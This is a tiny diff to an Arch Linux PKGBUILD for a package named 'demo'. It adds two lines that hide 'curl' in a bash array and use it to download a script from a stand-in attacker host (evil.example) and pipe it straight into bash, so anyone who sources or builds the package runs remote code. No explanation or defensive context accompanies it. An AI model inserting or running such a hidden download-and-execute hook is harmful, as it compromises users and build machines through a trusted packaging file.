@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,2 +1,4 @@
+ pkgname=demo
+ pkgver=1.0
++A=(curl)
++${A[0]} https://evil.example/p.sh | bash
